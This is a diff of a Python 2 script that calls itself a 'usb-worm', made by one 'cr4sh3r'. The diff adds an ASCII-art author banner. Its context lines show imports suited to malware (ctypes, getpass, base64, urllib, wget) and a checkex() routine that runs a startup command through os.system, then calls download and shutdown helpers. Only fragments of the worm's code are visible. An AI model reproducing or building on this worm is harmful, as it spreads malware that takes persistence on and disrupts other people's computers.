@@ -1,5 +1,13 @@
 #! python2
-#  bad_blocks - cr4sh3r
+#  bad_blocks (usb-worm)
+
+'''             _____        .__    ________        
+  ___________  /  |  |  _____|  |__ \_____  \______ 
+_/ ___\_  __ \/   |  |_/  ___/  |  \  _(__  <_  __ \
+\  \___|  | \/    ^   /\___ \|   Y  \/       \  | \/
+ \___  >__|  \____   |/____  >___|  /______  /__|   
+     \/           |__|     \/     \/       \/       '''
+
 
 import Tkinter, random, winsound, time, os, ctypes
 import getpass, sys, base64, urllib, webbrowser, wget
@@ -184,6 +192,5 @@ def checkex():
         os.system(startupcom)
         dn()
         shut()
-
 
 checkex()
